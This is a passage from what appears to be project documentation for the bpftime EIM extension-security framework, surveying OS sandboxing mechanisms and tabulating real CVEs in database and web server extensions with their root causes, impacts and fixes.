needs to be configured per application. It\u2019s typically combined with other controls (filesystem sandboxing via chroot or namespaces, etc., since seccomp itself doesn\u2019t manage file descriptors).</p> </li> <li> <p>Other OS models: Linux capabilities (not to be confused with Capsicum\u2019s use of the term) allow partitioning root privileges (e.g., a process can be given the capability to bind low-numbered ports but no other root power). OpenBSD\u2019s <code>pledge()</code> and <code>unveil()</code> calls allow processes to drop rights and limit file system access paths respectively, similar in spirit to Capsicum but simpler to use. These all enforce least privilege at the OS level. For instance, <code>unveil()</code> can restrict which file paths a process can access; after calling unveil, any attempt to open a file not unveiled is blocked by the OS \u2013 very useful for plugins or extensions that should only ever touch certain directories.</p> </li> </ul> <p>Integration with EIM: EIM can be thought of as bringing these OS-level sandboxing ideas into the realm of application extensions seamlessly. EIM could orchestrate OS-level protections on behalf of extensions. For example, when an extension is loaded, EIM (through the host application) could invoke seccomp or Capsicum automatically to lock down what that extension\u2019s code can do. Suppose we have a database application that allows extension modules: using EIM, when it loads an extension, it might create a sandboxed subprocess for it, apply a seccomp filter that disallows any networking or file access (since a DB extension might only need some in-memory computation and perhaps use a provided API to fetch data, but not open files on its own). This way, even if the extension tries, it cannot issue a dangerous syscall. Similarly, EIM could use something like Capsicum\u2019s approach: pre-open specific resources for the extension (if needed) and then drop the rest. </p> <p>One can see EIM as an orchestrator that combines in-app isolation (like RLBox) with OS isolation (like seccomp/Capsicum) for a belt-and-suspenders approach. The current browser extension systems partly do this (Chrome\u2019s extension processes are in an OS sandbox). But EIM would generalize it. It ensures that not only browsers but any host software uses OS security features to sandbox extensions.</p> <p>Effectiveness: These OS models have proven effective at mitigating exploits. For instance, even if an attacker finds a bug in Chrome\u2019s rendering engine, Chrome\u2019s seccomp sandbox might prevent them from doing a privileged operation to fully compromise the system (Seccomp and sandboxing [LWN.net]) (Seccomp and sandboxing [LWN.net]). Capsicum has shown that applications can be compartmentalized with minimal performance impact and big security wins (if one compartment is compromised, it can\u2019t affect others it has no capability for). EIM using these means extensions would be as secure as separate processes at the OS level when needed. </p> <p>Flexibility and Overhead: The overhead of using Capsicum or seccomp is very low (mainly some system call checking). The challenge is in making it transparent and easy \u2013 which is what EIM would handle. The extension developer wouldn\u2019t need to manually write seccomp filters; EIM knows, based on the extension\u2019s declared needs, what to allow. For example, if an extension doesn\u2019t need to write files, EIM\u2019s policy could automatically disallow all file-system write syscalls for that extension\u2019s process. This is analogous to Android\u2019s manifest permissions translating into Linux DAC rules for the app. The key point: EIM would leverage such principle-of-least-privilege enforcement at multiple layers, something prior art pieces each do individually but EIM combines.</p>"},{"location":"bpftime/EIM/study/compare/#33-eims-approach-to-current-gaps","title":"3.3 EIM\u2019s Approach to Current Gaps","text":"<p>Considering all the above, where does EIM fill gaps in extension security?</p> <ul> <li> <p>Unified Framework: Many of the approaches (browser manifest, seccomp, RLBox, etc.) address parts of the puzzle. EIM aims to provide a holistic framework that covers memory safety, runtime isolation, and permission control together. Current systems often implement one or two of these, but not all. For example, Chrome\u2019s extensions have sandboxed processes (isolation) and a permission system (least privilege), but the code in the extension is still just JavaScript running in V8 \u2013 if V8 had a bug, an extension might still do something unintended (though the OS sandbox would limit it). EIM would additionally ensure the extension code itself is in a safe sandbox representation, so even a JS engine bug has another line of defense.</p> </li> <li> <p>Generalization beyond Browsers: Much literature focuses on browsers (because they were a major source of extension security issues). EIM generalizes lessons from browsers to any software that supports extensions. For instance, a text editor, a game, or an IoT platform could all allow third-party modules, and EIM would provide a standard way to sandbox them. In industry, we see ad-hoc solutions: e.g., Adobe Reader now sandboxes its PDF plugins, or Microsoft Office has started running add-ins in separate processes with web tech. EIM could provide a consistent, proven approach applicable across domains, informed by the prior art we discussed.</p> </li> <li> <p>Layered Least Privilege: EIM doesn\u2019t just rely on one mechanism. It would implement least privilege in multiple dimensions: </p> </li> <li>Computational: The extension code can\u2019t exceed certain CPU or memory bounds (prevent DoS).</li> <li>Memory safety: The extension can\u2019t corrupt the host (via SFI or language safety).</li> <li>System interactions: The extension can only use allowed host APIs (like browser extension APIs or app-specific services) \u2013 no arbitrary syscalls or resource access (enforced via OS sandboxing like seccomp).</li> <li>Data access: The extension can only see data it\u2019s meant to (e.g., in a web context, respect same-origin policies; in a file context, only certain directories \u2013 achieved via capabilities/unveil, etc.).</li> <li> <p>Privilege separation: If an extension needs elevated privileges for some reason, EIM could isolate that portion in a separate component (similar to how Chrome split PDF plugin into a higher-privilege process with very limited rights otherwise). In general, EIM would encourage a design where extensions run with user-level privileges and often even less (no direct hardware access, etc.).</p> </li> <li> <p>Closing Specific Gaps: </p> </li> <li>Supply Chain &amp; Integrity: One gap not yet mentioned: ensuring extension code isn\u2019t tampered with. EIM can incorporate a signing verification (like browsers do) so only authentic code runs. This doesn\u2019t solve runtime issues, but prevents unauthorized code injection into the extension (which is why Manifest V3 banned remote code (Improve extension security \u00a0|\u00a0 Chrome Extensions \u00a0|\u00a0 Chrome for Developers)). </li> <li> <p>API Misuse: Many extension failures (like the AVG case) are not low-level exploits but logic mistakes or overly powerful APIs. EIM addresses this by mediating extension-host interactions. For example, if an extension wants to elevate privileges or perform an action, EIM could prompt the user or simply disallow it if not in the manifest. In essence, EIM acts as a policy enforcement layer at runtime, not just a static permission agreement. This dynamic aspect is something literature like \u201cconfinement of extensions\u201d (e.g., Brewer and Nash\u2019s Chinese Wall, or more relevantly, browser extension isolation research) suggests: monitor what extensions do, and restrict dangerous behaviors.</p> </li> <li> <p>Performance &amp; Usability: A gap in some academic solutions is they\u2019re too heavy or too hard to integrate (NaCl required special compile, Capsicum requires refactoring code, etc.). EIM\u2019s contribution could be packaging these techniques in a developer-friendly way. For instance, EIM might provide an SDK or container that developers plug into their apps to get extension safety out-of-the-box, without being security experts. The end-users or sysadmins could also get a unified interface to manage extension permissions (like how browsers show extension permission prompts \u2013 EIM could offer a similar UI for any extensible app). By basing EIM on known efficient mechanisms (like WASM, seccomp, MPK), it ensures overhead remains low \u2013 critical for adoption. </p> </li> </ul> <p>Insight: In conclusion, EIM can be viewed as the culmination of principles from prior extension security work: it employs least privilege (inspired by Capsicum, Chrome, Firefox), sandboxing (inspired by seccomp, NaCl, RLBox), and memory safety (inspired by language-based methods, WASM). The novelty of EIM is in how it integrates all these into one coherent model. It addresses current gaps by not leaving any single aspect of extension execution to chance. If a vulnerability slips through one layer (say, a zero-day in the sandbox engine), another layer (OS policy or hardware isolation) still protects the system \u2013 this layered defense is key to EIM. </p> <p>By drawing on the rich literature and existing technologies, EIM doesn\u2019t reinvent the wheel but rather combines wheels into a reliable vehicle for secure extensibility. The case studies underscored the need for such defense-in-depth. Similar approaches showed how to do it with acceptable cost. And prior art in least privilege established the policies that must guide it. EIM stands on these foundations to provide a safer future for extension ecosystems, where users can enjoy added functionality without sacrificing security.</p> <p>References:</p> <ul> <li>Microsoft Security Bulletin MS03-042 \u2013 Buffer Overflow in Troubleshooter ActiveX (2003) (Microsoft Security Bulletin MS03-042 - Critical | Microsoft Learn)  </li> <li>Tavis Ormandy, AVG Chrome Extension vulnerabilities (2015) (Google probes AVG Chrome widget after 9m users exposed by bugs \u2022 The Register)  </li> <li>DarkReading, Chrome Zero-Day Sandbox Escape (CVE-2024-4761) (Dangerous Google Chrome Zero-Day Allows Sandbox Escape)  </li> <li>Pentera Blog, eBPF vulnerability leads to kernel compromise (Understanding the Security Aspects of Linux eBPF - Pentera)  </li> <li>Adrienne Porter Felt, \u201cLeast Privilege for Browser Extensions\u201d (2010) () ()  </li> <li>Chrome Developer Docs \u2013 Manifest V3 Security Changes (Improve extension security \u00a0|\u00a0 Chrome Extensions \u00a0|\u00a0 Chrome for Developers) (Improve extension security \u00a0|\u00a0 Chrome Extensions \u00a0|\u00a0 Chrome for Developers) and \u201cStay Secure\u201d guidelines (Stay secure \u00a0|\u00a0 Chrome Extensions \u00a0|\u00a0 Chrome for Developers) (Stay secure \u00a0|\u00a0 Chrome Extensions \u00a0|\u00a0 Chrome for Developers)  </li> <li>Mozilla Attack &amp; Defense blog \u2013 RLBox in Firefox 95 (WebAssembly and Back Again: Fine-Grained Sandboxing in Firefox 95 \u2013 Attack &amp; Defense)  </li> <li>USENIX Security \u201920 \u2013 Narayan et al., RLBox paper (Retrofitting Fine Grain Isolation in the Firefox Renderer | USENIX)  </li> <li>USENIX Security \u201919 \u2013 Vahldiek-Oberwagner et al., ERIM paper (ERIM: Secure, Efficient In-process Isolation with Protection Keys (MPK) | USENIX)  </li> <li>LWN.net \u2013 Seccomp and Sandboxing (2009) (Seccomp and sandboxing [LWN.net])  </li> <li>CACM \u2013 Capsicum: Practical Capabilities for UNIX (A Taste of Capsicum \u2013 Communications of the ACM)  </li> <li>WebAssembly Security Documentation (Security - WebAssembly) (Security - WebAssembly).</li> </ul> <p>Share on  Share on </p>"},{"location":"bpftime/EIM/study/db-bug-study/","title":"Study on Bugs in Database and Web Server Extension Interfaces","text":"<p>Database systems and web servers often support extension interfaces \u2013 plug-in modules or scripting engines that extend core functionality (e.g. PostgreSQL extensions, MySQL plugins/UDFs, Apache/Nginx modules, IIS ISAPI). While powerful, these extensions have historically introduced numerous bugs, ranging from critical security vulnerabilities to logic and performance issues. In this study, we examine both historical and recent cases of such bugs in database and web server extensions, including security flaws (buffer overflows, privilege escalations, injection bugs) as well as general bugs (logic errors, performance bottlenecks, and compatibility problems). We present 20+ real-world cases in a structured format, then analyze common patterns, impacts on stability/maintainability, and the frequency/severity of different bug types.</p>"},{"location":"bpftime/EIM/study/db-bug-study/#case-studies-of-bugs-in-database-web-server-extensions","title":"Case Studies of Bugs in Database &amp; Web Server Extensions","text":"<p>The table below documents a selection of notable bugs affecting extension interfaces in databases (PostgreSQL, MySQL, Redis, MongoDB, etc.) and web servers (Apache HTTPd, Nginx, Microsoft IIS). Each case includes an identifier (CVE or issue), the affected software/module, classification of bug type, root cause, impact on the host system, and the resolution or mitigation.</p> Bug ID / CVE Affected Software (Extension) Bug Type Root Cause Impact on Host Software Resolution / Mitigation CVE-2023-39417 PostgreSQL (Extension Scripts) Security Improper quoting in extension install script allowed SQL injection (PostgreSQL: CVE-2023-39417: Extension script @substitutions@ within quoting allow SQL injection) Attacker can execute arbitrary SQL code as DB superuser (PostgreSQL: CVE-2023-39417: Extension script @substitutions@ within quoting allow SQL injection) Patched in core server to block unsafe script substitutions (PostgreSQL: CVE-2023-39417: Extension script @substitutions@ within quoting allow SQL injection) CVE-2022-2625 PostgreSQL (Extension Scripts) Security Extension script used <code>CREATE OR REPLACE</code> on non-extension object (logic flaw) (PostgreSQL: CVE-2022-2625: Extension scripts replace objects not belonging to the extension) Malicious object replacement could run code as another role (even superuser) (PostgreSQL: CVE-2022-2625: Extension scripts replace objects not belonging to the extension) Core server change to prevent replacing out-of-extension objects (PostgreSQL: CVE-2022-2625: Extension scripts replace objects not belonging to the extension) CVE-2023-32305 PostgreSQL (Aiven Extras Extension) Security Missing schema qualification in privileged extension functions (name collision) (NVD - cve-2023-32305) Low-priv user could create fake functions to escalate to superuser (full DB takeover) (NVD - cve-2023-32305) Fixed in extension v1.1.9 \u2013 added schema qualifiers to prevent hijacking (NVD - cve-2023-32305) CVE-2024-10979 PostgreSQL (PL/Perl Trusted Lang) Security PL/Perl trusted extension allowed setting arbitrary environment variables (sandbox escape) (Varonis Discovers New Vulnerability in PostgreSQL PL/Perl) (Varonis Discovers New Vulnerability in PostgreSQL PL/Perl) Could lead to execution of arbitrary code under DB process user by manipulating PATH (Varonis Discovers New Vulnerability in PostgreSQL PL/Perl) Patched in PostgreSQL \u2013 update PL/Perl to restrict env variable access (Varonis Discovers New Vulnerability in PostgreSQL PL/Perl) CVE-2005-2572 MySQL (User-Defined Functions) Security UDF library handling flaws: invalid library load hangs server on Windows; loading non-UDF library with matching symbols causes memory corruption (MySQL User-Defined Functions Multiple Vulnerabilities | Tenable\u00ae) (MySQL User-Defined Functions Multiple Vulnerabilities | Tenable\u00ae) Database freeze (Windows GUI dialog hang) or crash due to stack/memory corruption (MySQL User-Defined Functions Multiple Vulnerabilities | Tenable\u00ae) No immediate patch (at the time); admins instructed to restrict UDF creation privileges (MySQL User-Defined Functions Multiple Vulnerabilities | Tenable\u00ae) CVE-2021-2429 MySQL (InnoDB Memcached Plugin) Security Heap buffer overflow in <code>innodb_get()</code> \u2013 no total length check when concatenating table names for Memcached \u201cget @@\u201d requests (Oracle MySQL Server InnoDB Memcached Vulnerability) (Oracle MySQL Server InnoDB Memcached Vulnerability) Remote, unauthenticated attacker could overflow heap and execute arbitrary code in MySQL context (Oracle MySQL Server InnoDB Memcached Vulnerability) (Oracle MySQL Server InnoDB Memcached Vulnerability) Official patch released (fixed by bounds-checking string assembly) (Oracle MySQL Server InnoDB Memcached Vulnerability) CVE-2020-2921 MySQL (Group Replication Plugin) Security Unspecified logic flaw in group replication plugin (likely mishandled input or state) High-privilege attacker could cause the MySQL server to hang or repeatedly crash (complete DoS) (NVD - cve-2020-2921) Fixed in MySQL 8.0.20; part of Oracle Critical Patch Update (strengthened plugin input handling) CVE-2022-0543 Redis (Lua Scripting Engine \u2013 Debian pkg) Security Packaging issue led to Lua library misuse \u2013 allowed calling OS commands (Lua sandbox escape) (Redis sandbox escape (CVE-2022-0543)) Remote code execution: attacker (even unauthenticated) can execute commands on host via crafted Lua script (Redis sandbox escape (CVE-2022-0543)) Fixed by correcting Lua library linking in Debian/Ubuntu (removed unsafe module loading) (Redis sandbox escape (CVE-2022-0543)) CVE-2024-46981 Redis (Embedded Lua) Security Use-after-free in Lua garbage collector manipulation within Redis (Security Advisory: CVE-2024-46981, CVE-2024-51737, CVE-2024-51480, CVE-2024-55656 - Redis) Authenticated user can trigger memory corruption and achieve remote code execution (RCE) in Redis (Security Advisory: CVE-2024-46981, CVE-2024-51737, CVE-2024-51480, CVE-2024-55656 - Redis) Patched in Redis \u2013 update Lua engine and garbage collector handling to prevent UAF (Security Advisory: CVE-2024-46981, CVE-2024-51737, CVE-2024-51480, CVE-2024-55656 - Redis) CVE-2024-51737 Redis (RediSearch Module) Security Integer overflow in <code>FT.SEARCH</code>/<code>FT.AGGREGATE</code> (LIMIT or KNN arguments) causes heap overflow (Security Advisory: CVE-2024-46981, CVE-2024-51737, CVE-2024-51480, CVE-2024-55656 - Redis) Authenticated user can overflow heap and potentially execute code with Redis privileges (Security Advisory: CVE-2024-46981, CVE-2024-51737, CVE-2024-51480, CVE-2024-55656 - Redis) Fixed in RediSearch \u22651.1.9 \u2013 added bounds checking on LIMIT/KNN parameters (Security Advisory: CVE-2024-46981, CVE-2024-51737, CVE-2024-51480, CVE-2024-55656 - Redis) CVE-2024-51480 Redis (RedisTimeSeries Module) Security Integer overflow in time-series query commands (<code>TS.MGET</code>, <code>TS.MRANGE</code>, etc.) leads to heap buffer overflow (Security Advisory: CVE-2024-46981, CVE-2024-51737, CVE-2024-51480, CVE-2024-55656 - Redis) Heap memory corruption potentially allowing RCE in Redis process (via crafted command arguments) (Security Advisory: CVE-2024-46981, CVE-2024-51737, CVE-2024-51480, CVE-2024-55656 - Redis) Patched in RedisTimeSeries \u2013 input size validation and safe allocation applied (Security Advisory: CVE-2024-46981, CVE-2024-51737, CVE-2024-51480, CVE-2024-55656 - Redis) CVE-2024-55656 Redis (RedisBloom Module) Security Integer overflow in Bloom filter command (e.g. <code>CMS.INITBYDIM</code> with large parameters) (Security Advisory: CVE-2024-46981, CVE-2024-51737, CVE-2024-51480, CVE-2024-55656 - Redis) Heap overflow and remote code execution by authenticated user sending crafted command (CVSS 8.8) (Security Advisory: CVE-2024-46981, CVE-2024-51737, CVE-2024-51480, CVE-2024-55656 - Redis) Fixed in RedisBloom (v2.8.6+) \u2013 added checks for dimensions to prevent overflow (Security Advisory: CVE-2024-46981, CVE-2024-51737, CVE-2024-51480, CVE-2024-55656 - Redis) CVE-2018-16843 Nginx (HTTP/2 Module) Performance (DoS) Inefficient memory management for HTTP/2 requests \u2013 missing limits allowed excessive memory consumption (NVD - cve-2018-16843) Malicious HTTP/2 client can exhaust server memory, leading to process slowdown or crash (DoS) ([nginx-announce] nginx security advisory (CVE-2018-16843, CVE-2018-16844))(https://mailman.nginx.org/pipermail/nginx-announce/2018/000220.html#:~:text=The%20issues%20affect%20nginx%20compiled,used%20in%20a%20configuration%20file) Fixed in Nginx 1.15.6/1.14.1 \u2013 enforced memory usage limits in HTTP/2 processing ([nginx-announce] nginx security advisory (CVE-2018-16843, CVE-2018-16844))(https://mailman.nginx.org/pipermail/nginx-announce/2018/000220.html#:~:text=The%20issues%20affect%20nginx%20compiled,used%20in%20a%20configuration%20file) CVE-2018-16844 Nginx (HTTP/2 Module) Performance (DoS) HTTP/2 implementation bug causing high CPU usage (likely infinite loop or busy-wait) ([nginx-announce] nginx security advisory (CVE-2018-16843, CVE-2018-16844))(https://mailman.nginx.org/pipermail/nginx-announce/2018/000220.html#:~:text=Two%20security%20issues%20were%20identified,16844) Remote client can consume 100% CPU of a worker process, causing request handling to stall (DoS) ([nginx-announce] nginx security advisory (CVE-2018-16843, CVE-2018-16844))(https://mailman.nginx.org/pipermail/nginx-announce/2018/000220.html#:~:text=Two%20security%20issues%20were%20identified,16844) Fixed in Nginx 1.15.6/1.14.1 alongside CVE-16843 \u2013 corrected HTTP/2 state handling ([nginx-announce] nginx security advisory (CVE-2018-16843, CVE-2018-16844))(https://mailman.nginx.org/pipermail/nginx-announce/2018/000220.html#:~:text=The%20issues%20affect%20nginx%20compiled,used%20in%20a%20configuration%20file) CVE-2018-16845 Nginx (MP4 Video Module) Security/Logic Flawed MP4 file parsing could trigger an infinite loop or buffer over-read, possibly leaking memory ([nginx-announce] nginx security advisory (CVE-2018-16845))(https://mailman.nginx.org/pipermail/nginx-announce/2018/000221.html#:~:text=A%20security%20issue%20was%20identified,16845) Crafted MP4 file causes worker to hang or crash; potential exposure of memory contents (information leak) ([nginx-announce] nginx security advisory (CVE-2018-16845))(https://mailman.nginx.org/pipermail/nginx-announce/2018/000221.html#:~:text=A%20security%20issue%20was%20identified,16845) Patch applied (in Nginx 1.15.6/1.14.1) ([nginx-announce] nginx security advisory (CVE-2018-16845))(https://mailman.nginx.org/pipermail/nginx-announce/2018/000221.html#:~:text=The%20issue%20affects%20nginx%201,1) \u2013 fixed loop condition and added bounds checks CVE-2024-7347 Nginx (MP4 Video Module) Security Buffer overflow (memory over-read) in MP4 metadata handling when using the <code>mp4</code> directive (CVE-2024-7347 - NGINX MP4 Module Buffer Overflow Vulnerability) Attacker can cause the Nginx worker to read beyond buffer and terminate (crash) the process (CVE-2024-7347 - NGINX MP4 Module Buffer Overflow Vulnerability) Fixed in Nginx (Open Source &amp; Plus) \u2013 corrected MP4 parsing logic to prevent over-read (CVE-2024-7347 - NGINX MP4 Module Buffer Overflow Vulnerability) CVE-2022-30522 Apache HTTPd (mod_sed Filter) Performance (DoS) Buffer size miscalculation in stream-edit filter; memory allocation optimization error (CVE-2022-30522 - Apache httpd Denial of Service (DoS) vulnerability) Large request/response data causes uncontrolled memory growth, exceeding limits and aborting the process (server crash) (CVE-2022-30522 - Apache httpd Denial of Service (DoS) vulnerability) Fixed in Apache 2.4.54 \u2013 adjusted memory allocation strategy in mod_sed (proper buffer sizing) (CVE-2022-30522 - Apache httpd Denial of Service (DoS) vulnerability) CVE-2023-25690 Apache HTTPd (mod_proxy + Rewrite) Security (Logic) Inconsistent URL parsing in rewrite proxy rules \u2013 unsanitized user input reinjected into backend request (GitHub - dhmosfunk/CVE-2023-25690-POC: CVE 2023 25690 Proof of concept - mod_proxy vulnerable configuration on Apache HTTP Server versions 2.4.0 - 2.4.55 leads to HTTP Request Smuggling vulnerability.) HTTP Request Smuggling: attackers can bypass front-end access controls, proxy unintended internal URLs, or poison caches (GitHub - dhmosfunk/CVE-2023-25690-POC: CVE 2023 25690 Proof of concept - mod_proxy vulnerable configuration on Apache HTTP Server versions 2.4.0 - 2.4.55 leads to HTTP Request Smuggling vulnerability.) Fixed in Apache 2.4.56 \u2013 improved URL encoding/decoding in mod_proxy and mod_rewrite (GitHub - dhmosfunk/CVE-2023-25690-POC: CVE 2023 25690 Proof of concept - mod_proxy vulnerable configuration on Apache HTTP Server versions 2.4.0 - 2.4.55 leads to HTTP Request Smuggling vulnerability.) CVE-2010-0425 Apache HTTPd (mod_isapi on Windows) Security Use-after-free (dangling pointer) due to unloading ISAPI module before request completion (Apache mod_isapi Remote Code Execution Vulnerability - Threat Encyclopedia | Trend Micro (US)) Remote attacker can send crafted requests/reset packets to execute arbitrary code within Apache (under SYSTEM on Windows) (Apache mod_isapi Remote Code Execution Vulnerability - Threat Encyclopedia | Trend Micro (US)) Fixed in Apache 2.2.15/2.3.7 \u2013 ensure ISAPI request processing is complete before module unload (Apache mod_isapi Remote Code Execution Vulnerability - Threat Encyclopedia | Trend Micro (US)) CVE-2001-0500 Microsoft IIS (Indexing Service ISAPI, idq.dll) Security Unchecked buffer in idq.dll (ISAPI extension for Index Server) handling incoming URL data (Microsoft Security Bulletin MS01-033 - Critical | Microsoft Learn) Remote attacker can overflow buffer and execute code with SYSTEM privileges, taking complete control of the server (Microsoft Security Bulletin MS01-033 - Critical | Microsoft Learn) (Microsoft Security Bulletin MS01-033 - Critical | Microsoft Learn) Patch released (MS01-033) \u2013 fixed buffer handling; admins urged to remove .ida/.idq script mappings (Microsoft Security Bulletin MS01-033 - Critical | Microsoft Learn) (Microsoft Security Bulletin MS01-033 - Critical | Microsoft Learn) CVE-2017-7269 Microsoft IIS 6.0 (WebDAV Extension) Security Improper validation of the \u201cIf:\u201d header in a WebDAV PROPFIND request (buffer overflow in <code>ScStoragePathFromUrl</code>) (IIS 6.0 Vulnerability Leads to Code Execution | Trend Micro (US)) Crafted WebDAV request causes buffer overflow; leads to denial of service or remote code execution in context of IIS process (IIS 6.0 Vulnerability Leads to Code Execution | Trend Micro (US)) No official fix for IIS 6.0 (out of support); workaround was to disable WebDAV or apply custom mitigations (IIS 6.0 Vulnerability Leads to Code Execution | Trend Micro (US)) (No CVE) PostgreSQL/PostGIS Extension Upgrade Compatibility Extension version mismatch on major DB upgrade \u2013 PostGIS 3.0 required upgrade before PostgreSQL 9.6\u219210 (Solved: Unable to upgrade PostgreSQL 9.6 with postgis 3.0.... - Google Cloud Community) Upgrade failure: database refused to upgrade until extension was updated (maintenance downtime) (Solved: Unable to upgrade PostgreSQL 9.6 with postgis 3.0.... - Google Cloud Community) Resolve by upgrading the PostGIS extension to a compatible version (or using superuser to update extension) (Solved: Unable to upgrade PostgreSQL 9.6 with postgis 3.0.... - Google Cloud Community) (Solved: Unable to upgrade PostgreSQL 9.6 with postgis 3.0.... - Google Cloud Community) <p>Table: Notable bugs in database and web server extensions \u2013 covering security vulnerabilities (memory corruption, injection, privilege escalation) as well as general issues (performance bottlenecks, logic errors, and compatibility problems). Each case lists the bug\u2019s ID, affected platform/module, type, cause, impact, and resolution. Citations refer to sources describing the issue.</p>"},{"location":"bpftime/EIM/study/db-bug-study/#analysis-of-patterns-and-impacts","title":"Analysis of Patterns and Impacts","text":""},{"location":"bpftime/EIM/study/db-bug-study/#common-patterns-and-root-causes","title":"Common Patterns and Root Causes","text":"<p>Reviewing these cases reveals several recurring root cause patterns across both database and web server extensions:</p> <ul> <li> <p>Memory Safety Bugs: A majority of serious extension vulnerabilities stem from memory mismanagement in low-level code (typically C/C++). Examples include buffer overflows (e.g. IIS idq.dll overflow (Microsoft Security Bulletin MS01-033 - Critical | Microsoft Learn), Nginx MP4 module over-read (CVE-2024-7347 - NGINX MP4 Module Buffer Overflow Vulnerability), MySQL InnoDB Memcached heap overflow (Oracle MySQL Server InnoDB Memcached Vulnerability) (Oracle MySQL Server InnoDB Memcached Vulnerability)) and use-after-free/dangling pointer bugs (e.g. Apache mod_isapi UAF (Apache mod_isapi Remote Code Execution Vulnerability - Threat Encyclopedia | Trend Micro (US)), Redis Lua garbage collector UAF (Security Advisory: CVE-2024-46981, CVE-2024-51737, CVE-2024-51480, CVE-2024-55656 - Redis)). These flaws often occur due to lack of bounds-checking, improper lifecycle management (unloading modules too early), or integer overflow leading to undersized buffers. Memory corruption allows attackers to crash the host process or even inject malicious code for remote execution. This aligns with industry findings that ~70% of security bugs in systems code are memory-safety issues (Memory safety - Wikipedia).</p> </li> <li> <p>Input Validation and Logic Errors: Another common root cause is improper input handling or logic in extension interfaces. In several cases, extensions failed to properly sanitize or scope user-supplied data:</p> </li> <li>Injection vulnerabilities: PostgreSQL extension scripts did not adequately quote substitution parameters, leading to SQL injection (code execution) (PostgreSQL: CVE-2023-39417: Extension script @substitutions@ within quoting allow SQL injection). Apache\u2019s mod_proxy in certain rewrite configurations failed to normalize URLs, enabling HTTP request smuggling (GitHub - dhmosfunk/CVE-2023-25690-POC: CVE 2023 25690 Proof of concept - mod_proxy vulnerable configuration on Apache HTTP Server versions 2.4.0 - 2.4.55 leads to HTTP Request Smuggling vulnerability.). These are logic flaws where the extension trusts input in unsafe ways.</li> <li>Privilege/Isolation errors: Some database extensions didn\u2019t enforce schema or ownership boundaries. The Aiven Extras Postgres extension trusted function names without schema qualifiers, so a low-privilege user could hijack extension calls to escalate privileges (NVD - cve-2023-32305). Similarly, PostgreSQL\u2019s PL/Perl trusted language allowed environment changes, breaking the expected sandbox and leading to code execution (Varonis Discovers New Vulnerability in PostgreSQL PL/Perl). These mistakes in following security guidelines or isolating context result in privilege escalation or sandbox escape.</li> <li> <p>Algorithmic logic bugs: Extensions have caused infinite loops or excessive resource usage due to logic mistakes. For instance, Nginx\u2019s MP4 module (2018) could enter an infinite loop on a crafted file ( [nginx-announce] nginx security advisory (CVE-2018-16845)    ), and its HTTP/2 module could be tricked into extreme CPU or memory consumption ( [nginx-announce] nginx security advisory (CVE-2018-16843,    CVE-2018-16844)    ). Apache\u2019s mod_sed miscalculated buffer resizing, causing runaway memory growth (CVE-2022-30522 - Apache httpd Denial of Service (DoS) vulnerability). These are not memory corruption per se, but logical errors in handling certain states or inputs.</p> </li> <li> <p>Extension API Misuse: Some bugs arise from how the extension interface itself is used. MySQL\u2019s older UDF mechanism was abused by loading unintended libraries that defined certain symbol names, causing unpredictable behavior (crashes) (MySQL User-Defined Functions Multiple Vulnerabilities | Tenable\u00ae) \u2013 essentially the extension loader lacked strict validation of module binaries. In Apache, the ISAPI extension interface required careful coordination between the server and the ISAPI module; a failure to do so caused the mod_isapi bug (not waiting for the module call to finish before unloading) (Apache mod_isapi Remote Code Execution Vulnerability - Threat Encyclopedia | Trend Micro (US) ). These indicate that writing extensions is error-prone and mistakes in using the host\u2019s extension API can introduce serious flaws.</p> </li> </ul>"},{"location":"bpftime/EIM/study/db-bug-study/#impact-on-system-stability-maintainability-and-security","title":"Impact on System Stability, Maintainability, and Security","text":"<p>Bugs in extensions can significantly affect the stability and security of the host database or server, given that extensions typically run in-process with full access to host internals:</p> <ul> <li> <p>System Crashes and Downtime: Many of the cited bugs caused the entire database or web server to crash or hang. For example, a single malformed web request could crash an Nginx worker (MP4 module issues) ( [nginx-announce] nginx security advisory (CVE-2018-16845)    ) or even the whole Apache server (mod_sed memory overflow) (CVE-2022-30522 - Apache httpd Denial of Service (DoS) vulnerability). In databases, extension bugs like the PostgreSQL script vulnerabilities required an admin to install a malicious extension first, but others like MySQL\u2019s UDF flaw could be triggered by any user with minimal privileges to cause a hang (MySQL User-Defined Functions Multiple Vulnerabilities | Tenable\u00ae). Such denial-of-service conditions undermine availability and stability, often requiring emergency patches or reboots.</p> </li> <li> <p>Security Compromises: Extension vulnerabilities often have severe security implications because they run with high privileges. Several cases enabled remote code execution (RCE) on the host: e.g., the IIS idq.dll overflow allowed complete takeover of the server as SYSTEM (Microsoft Security Bulletin MS01-033 - Critical | Microsoft Learn) (Microsoft Security Bulletin MS01-033 - Critical | Microsoft Learn), and the Redis/RedisStack module overflows could execute code within the database process (Security Advisory: CVE-2024-46981, CVE-2024-51737, CVE-2024-51480, CVE-2024-55656 - Redis) (Security Advisory: CVE-2024-46981, CVE-2024-51737, CVE-2024-51480, CVE-2024-55656 - Redis). Privilege escalation within the DB (as with the Postgres extensions (NVD - cve-2023-32305)) can lead to exfiltration or tampering of all data. Even non-RCE logic flaws can lead to serious breaches, such as request smuggling in a proxy bypassing security controls (GitHub - dhmosfunk/CVE-2023-25690-POC: CVE 2023 25690 Proof of concept - mod_proxy vulnerable configuration on Apache HTTP Server versions 2.4.0 - 2.4.55 leads to HTTP Request Smuggling vulnerability.). In summary, bugs in trusted extensions break the security model of the host application, since they can bypass sandboxing or elevate privileges.</p> </li> <li> <p>Data Integrity and Confidentiality: Some extension bugs risk data corruption or leakage. For instance, the Nginx MP4 loop bug could leak memory contents (potentially exposing sensitive data in memory) ( [nginx-announce] nginx security advisory (CVE-2018-16845)    ). While not explicitly in our cases, a buggy storage engine extension in a database could corrupt indexes or data files, undermining integrity. Because extensions often operate at a low level, any flaw can directly impact the correctness and safety of data handled by the server.</p> </li> <li> <p>Maintainability and Compatibility: Extensions add complexity to system maintenance. The PostGIS upgrade scenario illustrates a compatibility issue \u2013 an outdated extension blocked a PostgreSQL upgrade (     Solved: Unable to upgrade PostgreSQL 9.6 with postgis 3.0.... - Google Cloud Community ). This highlights how extension interfaces must be kept in sync with core versions, requiring extra upgrade steps and knowledge. Additionally, patching extension-related bugs can be tricky; the mod_sed case showed that an incomplete fix introduced a new bug (CVE-2022-30522 was created by the patch for CVE-2022-23943 (CVE-2022-30522 - Apache httpd Denial of Service (DoS) vulnerability)). This fragility means maintainers must be very careful in testing extension changes. Some vendors responded by moving risky functionality out-of-process or tightening extension privileges (e.g., PostgreSQL only allows superusers to CREATE EXTENSION by default, to mitigate risk). Overall, while extensions provide flexibility, they increase the attack surface and maintenance burden on system administrators.</p> </li> 